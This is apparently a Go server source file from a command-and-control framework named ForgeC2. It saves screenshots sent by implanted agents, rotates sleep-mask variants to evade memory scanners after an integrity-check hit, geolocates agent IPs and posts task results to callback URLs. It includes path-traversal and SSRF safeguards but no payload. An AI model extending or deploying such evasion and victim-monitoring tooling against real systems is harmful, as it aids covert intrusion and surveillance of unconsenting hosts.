package server

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log/slog"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/forgec2/forgec2/internal/db"
	"github.com/gin-gonic/gin"
)

// ── Screenshots, sleep-mask rotation, path/IP/geo helpers, ls normalize ───

func (s *Server) saveScreenshot(dataDir, agentID string, taskID uint, b64Data string) {
	if s.IsScreenMonitoring(agentID) {
		return // do not retain files during live screen monitoring
	}
	s.writeScreenshotFile(dataDir, agentID, taskID, b64Data)
}

func (s *Server) writeScreenshotFile(dataDir, agentID string, taskID uint, b64Data string) {
	if dataDir == "" {
		dataDir = "data"
	}
	base := filepath.Join(dataDir, "screenshots")
	dir := safeJoin(base, agentID)
	if dir == "" {
		slog.Error("Invalid agent ID for screenshot path", "agent_id", agentID)
		return
	}
	if err := os.MkdirAll(dir, 0700); err != nil {
		slog.Error("Failed to create screenshots dir", "agent_id", agentID, "error", err)
		return
	}
	data, err := base64.StdEncoding.DecodeString(b64Data)
	if err != nil {
		return
	}
	filename := fmt.Sprintf("screenshot_%d_%d.png", taskID, time.Now().Unix())
	filePath := safeJoin(dir, filename)
	if filePath == "" {
		slog.Error("Invalid screenshot filename", "filename", filename)
		return
	}
	if err := os.WriteFile(filePath, data, 0600); err != nil {
		slog.Error("Failed to save screenshot", "file", filename, "error", err)
	}
}

func (s *Server) handleServeScreenshot(c *gin.Context) {
	agentID := c.Param("agent_id")
	filename := c.Param("filename")

	// Validate screenshot extension to prevent serving arbitrary files
	ext := strings.ToLower(filepath.Ext(filename))
	if ext != ".png" && ext != ".jpg" && ext != ".jpeg" && ext != ".gif" && ext != ".webp" {
		c.String(http.StatusBadRequest, "invalid screenshot file type")
		return
	}

	screenshotRoot := filepath.Clean(filepath.Join(s.cfg.Server.DataDir, "screenshots"))
	requested := safeJoin(safeJoin(screenshotRoot, agentID), filename)
	if requested == "" {
		c.String(http.StatusBadRequest, "invalid path")
		return
	}

	serveFileSafe(c, requested, screenshotRoot, "")
}

// safeJoin verifies that joining base+name stays within base, preventing path traversal.
// autoSwitchSleepMask rotates to a different sleep mask variant when integrity failure is detected.
// Output format: "sleep_mask_integrity_failure: mask=<name> page=<idx>"
func (s *Server) autoSwitchSleepMask(agentID string, output string) {
	slog.Error("Sleep mask integrity failure — auto-switching variant", "agent_id", agentID, "output", output)

	// Escalate the adaptive OPSEC threat score: a memory-scanner hit means
	// the host is actively hostile, and repeated hits push the agent toward
	// ThreatCritical where credential-access operations are blocked.
	if s.opsecAdaptive != nil {
		s.opsecAdaptive.RecordIntegrityFailure(agentID)
	}

	// Parse the current mask name from the alert output
	currentMask := ""
	if idx := strings.Index(output, "mask="); idx >= 0 {
		rest := output[idx+5:]
		if end := strings.IndexByte(rest, ' '); end >= 0 {
			currentMask = rest[:end]
		} else {
			currentMask = rest
		}
	}

	// Rotation order: advanced → zilean → foliage → advanced
	var nextMask string
	switch currentMask {
	case "advanced":
		nextMask = "zilean"
	case "zilean":
		nextMask = "foliage"
	case "foliage":
		nextMask = "advanced"
	default:
		nextMask = "advanced"
	}

	// Create a set_sleep_mask task for the agent with high priority
	t, err := s.createTask(agentID, "set_sleep_mask", nextMask, "", "", "", 0, 0)
	if err != nil {
		slog.Error("Failed to create auto-switch sleep mask task", "agent_id", agentID, "error", err)
		return
	}
	t.Priority = 2
	if err := s.db.Save(t).Error; err != nil {
		slog.Error("Failed to save auto-switch sleep mask task", "agent_id", agentID, "error", err)
		return
	}

	s.LogAuditRecord(nil, "auto_switch_sleep_mask", "agent", agentID,
		fmt.Sprintf("Auto-switched sleep mask from %s to %s due to integrity failure", currentMask, nextMask), true, nil)

	slog.Warn("Auto-switched sleep mask", "agent_id", agentID, "from", currentMask, "to", nextMask)
}

// Returns empty string if the path escapes the base directory.
func safeJoin(base, name string) string {
	cleanBase := filepath.Clean(base)
	target := filepath.Clean(filepath.Join(cleanBase, name))
	if !strings.HasPrefix(target, cleanBase+string(filepath.Separator)) && target != cleanBase {
		return ""
	}
	return target
}

func isPrivateIP(ip string) bool {
	if ip == "" || ip == "::1" {
		return true
	}
	if strings.HasPrefix(ip, "127.") || ip == "localhost" {
		return true
	}
	if strings.HasPrefix(ip, "10.") {
		return true
	}
	if strings.HasPrefix(ip, "192.168.") {
		return true
	}
	if strings.HasPrefix(ip, "169.254.") {
		return true
	}
	// 100.64.0.0/10 (CGNAT)
	parsed := net.ParseIP(ip)
	if parsed != nil && parsed.To4() != nil {
		b := parsed.To4()
		if b[0] == 100 && (b[1]&0xC0) == 64 {
			return true
		}
	}
	// 172.16.0.0/12
	if strings.HasPrefix(ip, "172.") {
		parts := strings.SplitN(ip, ".", 3)
		if len(parts) >= 2 {
			if second, err := strconv.Atoi(parts[1]); err == nil && second >= 16 && second <= 31 {
				return true
			}
		}
	}
	if parsed != nil {
		// IPv6 link-local fe80::/10
		if parsed.To4() == nil && parsed[0] == 0xfe && (parsed[1]&0xc0) == 0x80 {
			return true
		}
		// IPv6 ULA fc00::/7
		if parsed.To4() == nil && (parsed[0]&0xfe) == 0xfc {
			return true
		}
	}
	return false
}

// lookupGeoIP queries ip-api.com for geolocation data
func (s *Server) lookupGeoIP(ctx context.Context, ip string) (country, city string, lat, lon float64) {
	if isPrivateIP(ip) {
		return "", "", 0, 0
	}
	url := "https://ip-api.com/json/" + ip + "?fields=country,city,lat,lon"
	req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
	if err != nil {
		return "", "", 0, 0
	}
	resp, err := s.httpClient.Do(req)
	if err != nil {
		return "", "", 0, 0
	}
	defer resp.Body.Close()
	var result struct {
		Country string  `json:"country"`
		City    string  `json:"city"`
		Lat     float64 `json:"lat"`
		Lon     float64 `json:"lon"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return "", "", 0, 0
	}
	return result.Country, result.City, result.Lat, result.Lon
}

// normalizeLsResult converts a tab-separated "dir /s" style listing
// into a JSON array.  Returns the original string unchanged when there
// are no data lines (header/separator only).
func normalizeLsResult(raw string) string {
	lines := strings.Split(raw, "\n")

	type lsEntry struct {
		Name    string `json:"name"`
		IsDir   bool   `json:"is_dir"`
		Size    int64  `json:"size"`
		ModTime string `json:"mod_time"`
	}

	var entries []lsEntry
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "Type") || strings.HasPrefix(line, "---") || strings.HasPrefix(line, "─") {
			continue
		}
		parts := strings.SplitN(line, "\t", 4)
		if len(parts) < 4 {
			continue
		}
		isDir := strings.EqualFold(parts[0], "DIR")
		size, _ := strconv.ParseInt(parts[2], 10, 64)
		entries = append(entries, lsEntry{
			Name:    parts[1],
			IsDir:   isDir,
			Size:    size,
			ModTime: parts[3],
		})
	}

	if len(entries) == 0 {
		return raw
	}
	b, ok := marshalJSONSafe(entries)
	if !ok {
		return raw
	}
	return string(b)
}

// executeTaskCallback POSTs task completion results to the configured callback URL.
func (s *Server) executeTaskCallback(task db.Task, agentID string) {
	if err := validateWebhookURL(task.CallbackURL); err != nil {
		slog.Error("Callback URL rejected by SSRF filter", "task_id", task.ID, "url", task.CallbackURL, "error", err)
		return
	}

	payload := map[string]interface{}{
		"task_id":   task.ID,
		"agent_id":  agentID,
		"type":      task.Type,
		"command":   task.Command,
		"status":    task.Status,
		"result":    task.Result,
		"error":     task.Error,
		"completed": task.UpdatedAt.Format(time.RFC3339),
	}
	body, err := json.Marshal(payload)
	if err != nil {
		slog.Error("Failed to marshal callback payload", "task_id", task.ID, "error", err)
		return
	}

	method := strings.ToUpper(task.CallbackMethod)
	if method == "" {
		method = "POST"
	}

	req, err := http.NewRequest(method, task.CallbackURL, strings.NewReader(string(body)))
	if err != nil {
		slog.Error("Failed to create callback request", "task_id", task.ID, "url", task.CallbackURL, "error", err)
		return
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "ForgeC2-Callback/1.0")

	// ssrfSafeClient re-validates every redirect hop (P1-2): the plain
	// httpClient silently follows up to 10 redirects with no per-hop check,
	// letting an attacker URL 302 into cloud metadata / internal services
	// and carries the task result payload there.
	resp, err := ssrfSafeClient(s.httpClient).Do(req)
	if err != nil {
		slog.Error("Callback request failed", "task_id", task.ID, "url", task.CallbackURL, "error", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
		if err := s.db.Model(&task).Update("callback_sent", true).Error; err != nil {
			slog.Error("Failed to mark callback as sent", "task_id", task.ID, "error", err)
		}
		slog.Info("Task callback delivered", "task_id", task.ID, "url", task.CallbackURL, "status", resp.StatusCode)
	} else {
		slog.Warn("Task callback returned non-2xx", "task_id", task.ID, "url", task.CallbackURL, "status", resp.StatusCode)
	}
}
